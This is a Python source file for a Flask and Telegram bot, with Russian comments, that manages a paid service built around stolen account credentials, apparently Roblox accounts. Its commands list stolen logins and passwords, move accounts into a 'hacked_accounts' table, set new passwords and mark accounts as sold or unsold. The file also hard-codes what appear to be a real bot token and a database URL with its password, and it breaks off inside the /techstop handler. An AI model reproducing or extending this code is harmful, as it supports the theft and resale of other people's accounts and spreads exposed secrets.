# Импорт библиотек для работы бота, вебхука, базы данных и безопасности
from flask import Flask, request, abort
import telebot
from telebot import types
import psycopg2
import os
import requests
import threading
import time
import logging
import json
from datetime import datetime, timedelta
from functools import wraps
from ratelimit import limits, sleep_and_retry
import hashlib
import secrets
import ipaddress
import re
import uuid

# Настройка логирования для записи всех действий бота
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Инициализация Flask приложения для обработки HTTP-запросов
app = Flask(__name__)

# Конфигурация бота
TOKEN = '8028944732:AAFsvb4csGSRwtmEFYLGbnTKsCq1hOH6rm0'  # Токен Telegram бота
ADMIN_CHAT_ID = '6956377285'  # ID Создателя
DATABASE_URL = 'postgresql://roblox_db_user:vjBfo3Vwigs5pnm107BhEkXe6AOy3FWF@dpg-cvr25cngi27c738j8c50-a.oregon-postgres.render.com/roblox_db'
SITE_URL = os.getenv('SITE_URL', 'https://tg-bod.onrender.com')
SECRET_WEBHOOK_TOKEN = secrets.token_urlsafe(32)  # Секретный токен для вебхука

# Инициализация бота
try:
    bot = telebot.TeleBot(TOKEN)
    logger.info("Бот успешно инициализирован")
except Exception as e:
    logger.error(f"Ошибка инициализации бота: {e}")
    raise

# Глобальные переменные
processed_updates = set()  # Хранит ID обработанных обновлений
tech_mode = False  # Флаг технического режима
ad_keywords = [
    'подписка', 'заработок', 'реклама', 'продвижение', 'бесплатно',
    'акция', 'промо', 'скидка', 'casino', 'bet', 'казино', 'ставки',
    'деньги', 'инвестиции', 'бонус'
]  # Ключевые слова для фильтра рекламы
TELEGRAM_IP_RANGES = [
    ipaddress.IPv4Network('149.154.160.0/20'),
    ipaddress.IPv4Network('91.108.4.0/22')
]  # IP-диапазоны Telegram
CALLS = 100  # Лимит запросов
PERIOD = 60  # Период лимита (секунды)

# Функция хэширования для защиты данных
def hash_data(data):
    """Генерирует SHA-256 хэш для данных"""
    logger.debug(f"Хэширование данных: {data}")
    return hashlib.sha256(str(data).encode()).hexdigest()

# Проверка IP-адреса Telegram
def is_telegram_ip(ip):
    """Проверяет, принадлежит ли IP Telegram"""
    logger.info(f"Проверка IP: {ip}")
    try:
        client_ip = ipaddress.ip_address(ip)
        for network in TELEGRAM_IP_RANGES:
            if client_ip in network:
                logger.info(f"IP {ip} подтверждён как Telegram")
                return True
        logger.warning(f"IP {ip} не Telegram")
        return False
    except ValueError:
        logger.error(f"Неверный IP: {ip}")
        return False

# Декоратор для ограничения частоты запросов
@sleep_and_retry
@limits(calls=CALLS, period=PERIOD)
def rate_limited_endpoint(func):
    """Ограничивает частоту запросов к эндпоинту"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        logger.debug(f"Проверка лимита для {func.__name__}")
        return func(*args, **kwargs)
    return wrapper

# Получение текущего времени (UTC+2)
def get_current_time():
    """Возвращает время с учётом UTC+2"""
    logger.debug("Запрос времени")
    return datetime.now() + timedelta(hours=2)

# Подключение к базе данных
def get_db_connection():
    """Устанавливает соединение с PostgreSQL"""
    logger.info("Подключение к базе")
    try:
        conn = psycopg2.connect(DATABASE_URL)
        logger.info("База подключена")
        return conn
    except Exception as e:
        logger.error(f"Ошибка подключения: {e}")
        return None

# Инициализация базы данных
def init_db():
    """Создаёт таблицы и очищает данные"""
    logger.info("Инициализация базы")
    conn = get_db_connection()
    if conn is None:
        logger.error("База недоступна")
        return False
    try:
        c = conn.cursor()
        # Таблица пользователей
        logger.info("Создание таблицы users")
        c.execute('''
            CREATE TABLE IF NOT EXISTS users (
                chat_id TEXT PRIMARY KEY,
                prefix TEXT,
                subscription_end TEXT,
                last_activity TEXT,
                ip_hash TEXT
            )
        ''')
        # Таблица учётных данных
        logger.info("Создание таблицы credentials")
        c.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                login TEXT PRIMARY KEY,
                password TEXT,
                added_time TEXT,
                added_by TEXT
            )
        ''')
        # Таблица взломанных аккаунтов
        logger.info("Создание таблицы hacked_accounts")
        c.execute('''
            CREATE TABLE IF NOT EXISTS hacked_accounts (
                login TEXT PRIMARY KEY,
                password TEXT,
                hack_date TEXT,
                prefix TEXT,
                sold_status TEXT,
                linked_chat_id TEXT
            )
        ''')
        # Очистка таблиц для защиты от спама
        logger.info("Очистка credentials и hacked_accounts")
        c.execute("DELETE FROM credentials")
        c.execute("DELETE FROM hacked_accounts")
        # Добавление Создателя
        subscription_end = (get_current_time() + timedelta(days=3650)).isoformat()
        logger.info(f"Добавление Создателя: {ADMIN_CHAT_ID}")
        c.execute(
            '''
            INSERT INTO users (chat_id, prefix, subscription_end, last_activity, ip_hash)
            VALUES (%s, %s, %s, %s, %s)
            ON CONFLICT (chat_id) DO UPDATE
            SET prefix = EXCLUDED.prefix,
                subscription_end = EXCLUDED.subscription_end,
                last_activity = EXCLUDED.last_activity,
                ip_hash = EXCLUDED.ip_hash
            ''',
            (ADMIN_CHAT_ID, "Создатель", subscription_end, get_current_time().isoformat(), hash_data(ADMIN_CHAT_ID))
        )
        conn.commit()
        logger.info("База инициализирована")
        return True
    except Exception as e:
        logger.error(f"Ошибка инициализации: {e}")
        return False
    finally:
        conn.close()

# Поддержание активности сервера
def keep_alive():
    """Пингует сервер для активности"""
    logger.info("Запуск keep_alive")
    while True:
        try:
            response = requests.get(SITE_URL, timeout=10)
            logger.debug(f"Пинг {SITE_URL}: {response.status_code}")
        except Exception as e:
            logger.error(f"Ошибка keep_alive: {e}")
        time.sleep(60)

# Получение данных пользователя
def get_user(chat_id):
    """Извлекает данные пользователя"""
    logger.info(f"Запрос данных: {chat_id}")
    conn = get_db_connection()
    if conn is None:
        if chat_id == ADMIN_CHAT_ID:
            logger.info("Админ без базы")
            return {
                'prefix': 'Создатель',
                'subscription_end': get_current_time() + timedelta(days=3650),
                'last_activity': get_current_time().isoformat(),
                'ip_hash': hash_data(chat_id)
            }
        logger.warning("База недоступна")
        return None
    try:
        c = conn.cursor()
        c.execute(
            "SELECT prefix, subscription_end, last_activity, ip_hash FROM users WHERE chat_id = %s",
            (chat_id,)
        )
        result = c.fetchone()
        if result:
            logger.info(f"Пользователь {chat_id} найден")
            return {
                'prefix': result[0],
                'subscription_end': datetime.fromisoformat(result[1]) if result[1] else None,
                'last_activity': result[2],
                'ip_hash': result[3]
            }
        logger.warning(f"Пользователь {chat_id} не найден")
        return None
    except Exception as e:
        logger.error(f"Ошибка получения данных: {e}")
        return None
    finally:
        conn.close()

# Сохранение пользователя
def save_user(chat_id, prefix, subscription_end=None, ip=None):
    """Сохраняет или обновляет пользователя"""
    logger.info(f"Сохранение: {chat_id}")
    conn = get_db_connection()
    if conn is None:
        logger.error("База недоступна")
        return
    try:
        c = conn.cursor()
        subscription_end = subscription_end or get_current_time().isoformat()
        ip_hash = hash_data(ip or chat_id)
        last_activity = get_current_time().isoformat()
        c.execute(
            '''
            INSERT INTO users (chat_id, prefix, subscription_end, last_activity, ip_hash)
            VALUES (%s, %s, %s, %s, %s)
            ON CONFLICT (chat_id) DO UPDATE
            SET prefix = %s,
                subscription_end = %s,
                last_activity = %s,
                ip_hash = %s
            ''',
            (chat_id, prefix, subscription_end, last_activity, ip_hash,
             prefix, subscription_end, last_activity, ip_hash)
        )
        conn.commit()
        logger.info(f"Пользователь {chat_id} сохранён")
    except Exception as e:
        logger.error(f"Ошибка сохранения: {e}")
    finally:
        conn.close()

# Проверка доступа
def check_access(chat_id, command):
    """Проверяет доступ к команде"""
    global tech_mode
    logger.info(f"Проверка доступа: {chat_id} для {command}")
    if tech_mode and chat_id != ADMIN_CHAT_ID:
        logger.warning(f"Тех. режим: {chat_id} заблокирован")
        return "🔧 Бот на техобслуживании!"
    user = get_user(chat_id)
    if user is None and command in ['start', 'menu', 'getchatid', 'support', 'site']:
        logger.info(f"Регистрация {chat_id} как Посетитель")
        save_user(chat_id, "Посетитель")
        user = get_user(chat_id)
    if not user or user['prefix'] == 'Посетитель':
        if command in ['start', 'menu', 'getchatid', 'support', 'site']:
            logger.debug(f"Разрешён {command}")
            return None
        logger.warning(f"Запрещён {command} для {chat_id}")
        return "🔒 Доступ ограничен! Подписка: @sacoectasy"
    if user['subscription_end'] and user['subscription_end'] < get_current_time():
        logger.info(f"Подписка истекла: {chat_id}")
        save_user(chat_id, 'Посетитель', get_current_time().isoformat())
        return "🔒 Подписка истекла! @sacoectasy"
    if command in ['hacked', 'passwords', 'admin', 'database', 'techstop', 'techstopoff',
                  'adprefix', 'delprefix', 'adduser', 'addcred', 'addhacked', 'broadcast'] and user['prefix'] != 'Создатель':
        logger.warning(f"Попытка админ-команды {command} от {chat_id}")
        return "🔒 Только для Создателя!"
    logger.debug(f"Разрешён {command}")
    return None

# Очистка ввода от инъекций
def sanitize_input(text):
    """Убирает опасные символы"""
    if not text:
        return text
    dangerous_chars = [';', '--', '/*', '*/', 'DROP', 'SELECT', 'INSERT', 'UPDATE', 'DELETE']
    for char in dangerous_chars:
        text = text.replace(char, '')
    logger.debug(f"Очищен текст: {text}")
    return text

# Получение всех пользователей
def get_all_users():
    """Возвращает список chat_id"""
    logger.info("Запрос пользователей")
    conn = get_db_connection()
    if conn is None:
        logger.error("База недоступна")
        return []
    try:
        c = conn.cursor()
        c.execute("SELECT chat_id FROM users")
        users = [row[0] for row in c.fetchall()]
        logger.info(f"Найдено {len(users)} пользователей")
        return users
    except Exception as e:
        logger.error(f"Ошибка получения пользователей: {e}")
        return []
    finally:
        conn.close()

# Проверка статуса бота
def check_bot_status():
    """Проверяет, активен ли бот"""
    logger.info("Проверка статуса")
    try:
        bot.get_me()
        logger.info("Бот активен")
        return True
    except Exception as e:
        logger.error(f"Бот не отвечает: {e}")
        return False

# Главная страница
@app.route('/')
def index():
    """Проверка статуса сервера"""
    logger.info("Запрос на /")
    if check_bot_status():
        return "Bot is running!", 200
    logger.error("Бот не отвечает")
    return "Bot is down!", 500

# Вебхук
@app.route('/webhook', methods=['POST'])
@rate_limited_endpoint
def webhook():
    """Обработка обновлений Telegram"""
    logger.info("Запрос на /webhook")
    client_ip = request.remote_addr
    if not is_telegram_ip(client_ip):
        logger.warning(f"Несанкционированный IP: {client_ip}")
        abort(403)
    secret_token = request.headers.get('X-Telegram-Bot-Api-Secret-Token')
    if secret_token != SECRET_WEBHOOK_TOKEN:
        logger.warning(f"Неверный токен: {secret_token}")
        abort(403)
    if request.headers.get('content-type') != 'application/json':
        logger.warning("Неверный content-type")
        abort(400)
    try:
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        if not update or not (update.message or update.callback_query):
            logger.debug("Пустое обновление")
            return 'OK', 200
        update_id = update.update_id
        if update_id in processed_updates:
            logger.info(f"Повтор update_id: {update_id}")
            return 'OK', 200
        processed_updates.add(update_id)
        logger.info(f"Обработка update_id: {update_id}")
        bot.process_new_updates([update])
        return 'OK', 200
    except Exception as e:
        logger.error(f"Ошибка вебхука: {e}")
        return 'OK', 200

# Команда /start
@bot.message_handler(commands=['start'])
def start_cmd(message):
    """Запускает бота и регистрирует пользователя"""
    chat_id = str(message.chat.id)
    logger.info(f"/start от {chat_id}")
    access = check_access(chat_id, 'start')
    if access:
        try:
            bot.reply_to(message, access)
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /start: {e}")
        return
    response = "✨ Добро пожаловать! Используйте /menu для команд."
    try:
        bot.reply_to(message, response)
        logger.info(f"Ответ: {response}")
        save_user(chat_id, "Посетитель", ip=message.from_user.id)
    except Exception as e:
        logger.error(f"Ошибка отправки /start: {e}")

# Команда /menu
@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    """Показывает меню команд"""
    chat_id = str(message.chat.id)
    logger.info(f"/menu от {chat_id}")
    access = check_access(chat_id, 'menu')
    if access:
        try:
            bot.reply_to(message, access)
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /menu: {e}")
        return
    user = get_user(chat_id)
    response = (
        f"👤 Статус: {user['prefix']}\n"
        f"📋 Команды:\n"
        f"/start - Запустить бота\n"
        f"/menu - Главное меню\n"
        f"/getchatid - Узнать ваш ID\n"
        f"/support - Сообщить об ошибке\n"
        f"/site - Ссылка на сайт\n"
    )
    if user['prefix'] == 'Создатель':
        response += (
            f"/hacked - Список взломанных аккаунтов\n"
            f"/passwords - Список паролей\n"
            f"/admin - Панель администратора\n"
            f"/database - Управление базой\n"
            f"/techstop - Включить техперерыв\n"
            f"/techstopoff - Выключить техперерыв\n"
            f"/adprefix - Выдать подписку\n"
            f"/delprefix - Сбросить подписку\n"
            f"/adduser - Добавить пользователя\n"
            f"/addcred - Добавить пароль\n"
            f"/addhacked - Добавить взломанный аккаунт\n"
            f"/broadcast - Рассылка всем\n"
        )
    try:
        bot.reply_to(message, response)
        logger.info(f"Ответ: {response}")
        save_user(chat_id, user['prefix'], user['subscription_end'], message.from_user.id)
    except Exception as e:
        logger.error(f"Ошибка отправки /menu: {e}")

# Команда /getchatid
@bot.message_handler(commands=['getchatid'])
def getchatid_cmd(message):
    """Возвращает ID и юзернейм"""
    chat_id = str(message.chat.id)
    logger.info(f"/getchatid от {chat_id}")
    access = check_access(chat_id, 'getchatid')
    if access:
        try:
            bot.reply_to(message, access)
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /getchatid: {e}")
        return
    username = sanitize_input(message.from_user.username) or "Нет юзернейма"
    response = f"👤 ID: `{chat_id}`\nЮзернейм: @{username}"
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        logger.info(f"Ответ: {response}")
        user = get_user(chat_id)
        save_user(chat_id, user['prefix'], user['subscription_end'], message.from_user.id)
    except Exception as e:
        logger.error(f"Ошибка отправки /getchatid: {e}")

# Команда /support
@bot.message_handler(commands=['support'])
def support_cmd(message):
    """Запрашивает сообщение для поддержки"""
    chat_id = str(message.chat.id)
    logger.info(f"/support от {chat_id}")
    access = check_access(chat_id, 'support')
    if access:
        try:
            bot.reply_to(message, access)
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /support: {e}")
        return
    response = "📩 Опишите проблему:"
    try:
        msg = bot.reply_to(message, response)
        bot.register_next_step_handler(msg, process_support_message)
        logger.info(f"Запрошена проблема от {chat_id}")
    except Exception as e:
        logger.error(f"Ошибка /support: {e}")

def process_support_message(message):
    """Пересылает сообщение Создателю"""
    chat_id = str(message.chat.id)
    text = sanitize_input(message.text)
    logger.info(f"Сообщение поддержки от {chat_id}: {text}")
    if not text:
        try:
            bot.reply_to(message, "❌ Сообщение не может быть пустым!")
            logger.warning("Пустое сообщение поддержки")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        bot.send_message(ADMIN_CHAT_ID, f"📩 Сообщение поддержки от {chat_id}:\n{text}")
        bot.reply_to(message, "✅ Сообщение отправлено!")
        logger.info(f"Поддержка отправлена от {chat_id}")
    except Exception as e:
        logger.error(f"Ошибка отправки поддержки: {e}")

# Команда /site
@bot.message_handler(commands=['site'])
def site_cmd(message):
    """Возвращает ссылку на сайт"""
    chat_id = str(message.chat.id)
    logger.info(f"/site от {chat_id}")
    access = check_access(chat_id, 'site')
    if access:
        try:
            bot.reply_to(message, access)
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /site: {e}")
        return
    response = "🌐 Сайт: @sacoectasy"
    try:
        bot.reply_to(message, response)
        logger.info(f"Ответ: {response}")
        user = get_user(chat_id)
        save_user(chat_id, user['prefix'], user['subscription_end'], message.from_user.id)
    except Exception as e:
        logger.error(f"Ошибка отправки /site: {e}")

# Команда /hacked
@bot.message_handler(commands=['hacked'])
def hacked_cmd(message):
    """Показывает взломанные аккаунты"""
    chat_id = str(message.chat.id)
    logger.info(f"/hacked от {chat_id}")
    access = check_access(chat_id, 'hacked')
    if access:
        try:
            bot.reply_to(message, access)
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /hacked: {e}")
        return
    conn = get_db_connection()
    if conn is None:
        try:
            bot.reply_to(message, "❌ База недоступна!")
            logger.error("База недоступна")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        c = conn.cursor()
        c.execute("SELECT login, password, sold_status FROM hacked_accounts")
        accounts = c.fetchall()
        if not accounts:
            response = "📊 Список взломанных аккаунтов пуст."
        else:
            response = "📊 Взломанные аккаунты:\n"
            for login, password, status in accounts:
                response += f"Логин: {login}, Пароль: {password}, Статус: {status}\n"
        bot.reply_to(message, response)
        logger.info(f"Ответ: {response}")
        user = get_user(chat_id)
        save_user(chat_id, user['prefix'], user['subscription_end'], message.from_user.id)
    except Exception as e:
        logger.error(f"Ошибка /hacked: {e}")
        bot.reply_to(message, "❌ Ошибка при загрузке!")
    finally:
        conn.close()

# Команда /passwords
@bot.message_handler(commands=['passwords'])
def passwords_cmd(message):
    """Показывает пароли с кнопками"""
    chat_id = str(message.chat.id)
    logger.info(f"/passwords от {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        try:
            bot.reply_to(message, access)
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /passwords: {e}")
        return
    conn = get_db_connection()
    if conn is None:
        try:
            bot.reply_to(message, "❌ База недоступна!")
            logger.error("База недоступна")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        c = conn.cursor()
        c.execute("SELECT login, password FROM credentials")
        credentials = c.fetchall()
        if not credentials:
            response = "🔑 Список паролей пуст."
            bot.reply_to(message, response)
        else:
            response = "🔑 Пароли:\n"
            for login, password in credentials:
                response += f"Логин: {login}, Пароль: {password}\n"
            bot.reply_to(message, response)
            # Создание инлайн-клавиатуры
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(
                types.InlineKeyboardButton("Добавить в hacked", callback_data="add_to_hacked"),
                types.InlineKeyboardButton("Удалить", callback_data="delete_cred")
            )
            bot.send_message(chat_id, "Выберите действие:", reply_markup=keyboard)
        logger.info(f"Ответ: {response}")
        user = get_user(chat_id)
        save_user(chat_id, user['prefix'], user['subscription_end'], message.from_user.id)
    except Exception as e:
        logger.error(f"Ошибка /passwords: {e}")
        bot.reply_to(message, "❌ Ошибка при загрузке!")
    finally:
        conn.close()

# Обработка кнопок для /passwords
@bot.callback_query_handler(func=lambda call: call.data in ['add_to_hacked', 'delete_cred'])
def handle_passwords_buttons(call):
    """Обрабатывает кнопки для /passwords"""
    chat_id = str(call.message.chat.id)
    logger.info(f"Кнопка {call.data} от {chat_id}")
    if check_access(chat_id, 'passwords'):
        try:
            bot.answer_callback_query(call.id)
            bot.send_message(chat_id, "🔒 Доступ запрещён!")
            logger.warning(f"Доступ запрещён для {chat_id}")
        except Exception as e:
            logger.error(f"Ошибка ответа на кнопку: {e}")
        return
    if call.data == 'add_to_hacked':
        try:
            msg = bot.send_message(chat_id, "Введите логин для переноса в hacked:")
            bot.register_next_step_handler(msg, process_hacked_login)
            bot.answer_callback_query(call.id)
            logger.info(f"Запрошен логин для hacked от {chat_id}")
        except Exception as e:
            logger.error(f"Ошибка кнопки add_to_hacked: {e}")
    elif call.data == 'delete_cred':
        try:
            msg = bot.send_message(chat_id, "Введите логин для удаления:")
            bot.register_next_step_handler(msg, process_delete_cred)
            bot.answer_callback_query(call.id)
            logger.info(f"Запрошено удаление от {chat_id}")
        except Exception as e:
            logger.error(f"Ошибка кнопки delete_cred: {e}")

def process_hacked_login(message):
    """Обрабатывает логин для переноса в hacked"""
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"Логин для hacked: {login} от {chat_id}")
    if not login:
        try:
            bot.reply_to(message, "❌ Логин не может быть пустым!")
            logger.warning("Пустой логин")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    conn = get_db_connection()
    if conn is None:
        try:
            bot.reply_to(message, "❌ База недоступна!")
            logger.error("База недоступна")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        c = conn.cursor()
        c.execute("SELECT password FROM credentials WHERE login = %s", (login,))
        result = c.fetchone()
        if not result:
            bot.reply_to(message, "❌ Логин не найден!")
            logger.warning(f"Логин {login} не найден")
            conn.close()
            return
        password = result[0]
        msg = bot.reply_to(message, "Введите новый пароль для hacked:")
        bot.register_next_step_handler(msg, lambda m: process_hacked_password(m, login, password))
        logger.info(f"Запрошен пароль для {login}")
    except Exception as e:
        logger.error(f"Ошибка обработки логина: {e}")
        bot.reply_to(message, "❌ Ошибка!")
    finally:
        conn.close()

def process_hacked_password(message, login, old_password):
    """Обрабатывает новый пароль и статус"""
    chat_id = str(message.chat.id)
    new_password = sanitize_input(message.text)
    logger.info(f"Новый пароль для {login}: {new_password}")
    if not new_password:
        try:
            bot.reply_to(message, "❌ Пароль не может быть пустым!")
            logger.warning("Пустой пароль")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton("Продан", callback_data=f"hacked_status_sold_{login}_{new_password}"),
        types.InlineKeyboardButton("Непродан", callback_data=f"hacked_status_not_sold_{login}_{new_password}")
    )
    try:
        bot.reply_to(message, "Выберите статус:", reply_markup=keyboard)
        logger.info(f"Запрошен статус для {login}")
    except Exception as e:
        logger.error(f"Ошибка выбора статуса: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('hacked_status_'))
def handle_hacked_status(call):
    """Обрабатывает статус для hacked"""
    chat_id = str(call.message.chat.id)
    logger.info(f"Статус {call.data} от {chat_id}")
    if check_access(chat_id, 'passwords'):
        try:
            bot.answer_callback_query(call.id)
            bot.send_message(chat_id, "🔒 Доступ запрещён!")
            logger.warning(f"Доступ запрещён")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    _, status, login, password = call.data.split('_', 3)
    sold_status = "Продан" if status == "sold" else "Непродан"
    conn = get_db_connection()
    if conn is None:
        try:
            bot.send_message(chat_id, "❌ База недоступна!")
            logger.error("База недоступна")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        c = conn.cursor()
        c.execute(
            '''
            INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id)
            VALUES (%s, %s, %s, %s, %s, %s)
            ''',
            (login, password, get_current_time().isoformat(), "Админ", sold_status, chat_id)
        )
        c.execute("DELETE FROM credentials WHERE login = %s", (login,))
        conn.commit()
        bot.send_message(chat_id, f"✅ Аккаунт {login} добавлен в hacked ({sold_status})!")
        logger.info(f"Добавлен в hacked: {login}, {sold_status}")
    except Exception as e:
        logger.error(f"Ошибка добавления в hacked: {e}")
        bot.send_message(chat_id, "❌ Ошибка!")
    finally:
        conn.close()
    try:
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"Ошибка ответа на кнопку: {e}")

def process_delete_cred(message):
    """Удаляет запись из credentials"""
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"Удаление логина: {login} от {chat_id}")
    if not login:
        try:
            bot.reply_to(message, "❌ Логин не может быть пустым!")
            logger.warning("Пустой логин")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    conn = get_db_connection()
    if conn is None:
        try:
            bot.reply_to(message, "❌ База недоступна!")
            logger.error("База недоступна")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        c = conn.cursor()
        c.execute("DELETE FROM credentials WHERE login = %s", (login,))
        if c.rowcount == 0:
            bot.reply_to(message, "❌ Логин не найден!")
            logger.warning(f"Логин {login} не найден")
        else:
            conn.commit()
            bot.reply_to(message, f"✅ Логин {login} удалён!")
            logger.info(f"Удалён логин: {login}")
    except Exception as e:
        logger.error(f"Ошибка удаления: {e}")
        bot.reply_to(message, "❌ Ошибка!")
    finally:
        conn.close()

# Команда /admin
@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    """Показывает панель админа"""
    chat_id = str(message.chat.id)
    logger.info(f"/admin от {chat_id}")
    access = check_access(chat_id, 'admin')
    if access:
        try:
            bot.reply_to(message, access)
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /admin: {e}")
        return
    response = (
        "🔧 Панель администратора:\n"
        "/hacked - Список взломанных аккаунтов\n"
        "/passwords - Список паролей\n"
        "/database - Управление базой\n"
        "/techstop - Включить техперерыв\n"
        "/techstopoff - Выключить техперерыв\n"
        "/adprefix - Выдать подписку\n"
        "/delprefix - Сбросить подписку\n"
        "/adduser - Добавить пользователя\n"
        "/addcred - Добавить пароль\n"
        "/addhacked - Добавить взломанный аккаунт\n"
        "/broadcast - Рассылка всем\n"
    )
    try:
        bot.reply_to(message, response)
        logger.info(f"Ответ: {response}")
        user = get_user(chat_id)
        save_user(chat_id, user['prefix'], user['subscription_end'], message.from_user.id)
    except Exception as e:
        logger.error(f"Ошибка отправки /admin: {e}")

# Команда /database
@bot.message_handler(commands=['database'])
def database_cmd(message):
    """Управление базой с кнопками"""
    chat_id = str(message.chat.id)
    logger.info(f"/database от {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        try:
            bot.reply_to(message, access)
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /database: {e}")
        return
    response = "📊 Управление базой данных:"
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton("Добавить", callback_data="db_add"),
        types.InlineKeyboardButton("Удалить", callback_data="db_delete")
    )
    try:
        bot.reply_to(message, response, reply_markup=keyboard)
        logger.info(f"Ответ: {response}")
        user = get_user(chat_id)
        save_user(chat_id, user['prefix'], user['subscription_end'], message.from_user.id)
    except Exception as e:
        logger.error(f"Ошибка отправки /database: {e}")

@bot.callback_query_handler(func=lambda call: call.data in ['db_add', 'db_delete'])
def handle_database_buttons(call):
    """Обрабатывает кнопки для /database"""
    chat_id = str(call.message.chat.id)
    logger.info(f"Кнопка {call.data} от {chat_id}")
    if check_access(chat_id, 'database'):
        try:
            bot.answer_callback_query(call.id)
            bot.send_message(chat_id, "🔒 Доступ запрещён!")
            logger.warning(f"Доступ запрещён")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    if call.data == 'db_add':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(
            types.InlineKeyboardButton("В hacked", callback_data="db_add_hacked"),
            types.InlineKeyboardButton("В credentials", callback_data="db_add_cred"),
            types.InlineKeyboardButton("Новый логин", callback_data="db_add_user")
        )
        try:
            bot.send_message(chat_id, "Выберите, куда добавить:", reply_markup=keyboard)
            bot.answer_callback_query(call.id)
            logger.info(f"Запрошено добавление от {chat_id}")
        except Exception as e:
            logger.error(f"Ошибка кнопки db_add: {e}")
    elif call.data == 'db_delete':
        try:
            msg = bot.send_message(chat_id, "Введите логин для удаления:")
            bot.register_next_step_handler(msg, process_db_delete)
            bot.answer_callback_query(call.id)
            logger.info(f"Запрошено удаление от {chat_id}")
        except Exception as e:
            logger.error(f"Ошибка кнопки db_delete: {e}")

@bot.callback_query_handler(func=lambda call: call.data in ['db_add_hacked', 'db_add_cred', 'db_add_user'])
def handle_db_add_buttons(call):
    """Обрабатывает выбор добавления"""
    chat_id = str(call.message.chat.id)
    logger.info(f"Кнопка {call.data} от {chat_id}")
    if check_access(chat_id, 'database'):
        try:
            bot.answer_callback_query(call.id)
            bot.send_message(chat_id, "🔒 Доступ запрещён!")
            logger.warning(f"Доступ запрещён")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    if call.data == 'db_add_hacked':
        try:
            msg = bot.send_message(chat_id, "Введите логин для hacked:")
            bot.register_next_step_handler(msg, process_add_hacked_login)
            bot.answer_callback_query(call.id)
            logger.info(f"Запрошен логин для hacked")
        except Exception as e:
            logger.error(f"Ошибка db_add_hacked: {e}")
    elif call.data == 'db_add_cred':
        try:
            msg = bot.send_message(chat_id, "Введите логин для credentials:")
            bot.register_next_step_handler(msg, process_add_cred_login)
            bot.answer_callback_query(call.id)
            logger.info(f"Запрошен логин для credentials")
        except Exception as e:
            logger.error(f"Ошибка db_add_cred: {e}")
    elif call.data == 'db_add_user':
        try:
            msg = bot.send_message(chat_id, "Введите chat_id нового пользователя:")
            bot.register_next_step_handler(msg, process_add_user)
            bot.answer_callback_query(call.id)
            logger.info(f"Запрошен новый пользователь")
        except Exception as e:
            logger.error(f"Ошибка db_add_user: {e}")

def process_db_delete(message):
    """Удаляет запись из базы"""
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"Удаление логина: {login} от {chat_id}")
    if not login:
        try:
            bot.reply_to(message, "❌ Логин не может быть пустым!")
            logger.warning("Пустой логин")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    conn = get_db_connection()
    if conn is None:
        try:
            bot.reply_to(message, "❌ База недоступна!")
            logger.error("База недоступна")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        c = conn.cursor()
        c.execute("DELETE FROM credentials WHERE login = %s", (login,))
        c.execute("DELETE FROM hacked_accounts WHERE login = %s", (login,))
        if c.rowcount == 0:
            bot.reply_to(message, "❌ Логин не найден!")
            logger.warning(f"Логин {login} не найден")
        else:
            conn.commit()
            bot.reply_to(message, f"✅ Логин {login} удалён!")
            logger.info(f"Удалён логин: {login}")
    except Exception as e:
        logger.error(f"Ошибка удаления: {e}")
        bot.reply_to(message, "❌ Ошибка!")
    finally:
        conn.close()

# Команда /techstop
@bot.message_handler(commands=['techstop'])
def techstop_cmd(message):
    """Включает тех. режим"""
    global tech_mode
    chat_id = str(message.chat.id)
    logger.info(f"/techstop от {chat_id}")
    access = check_access(chat_id, 'techstop')
    if access:
        try:
            bot.reply_to(message, access)
            logger.info(f"Ответ: {access}")
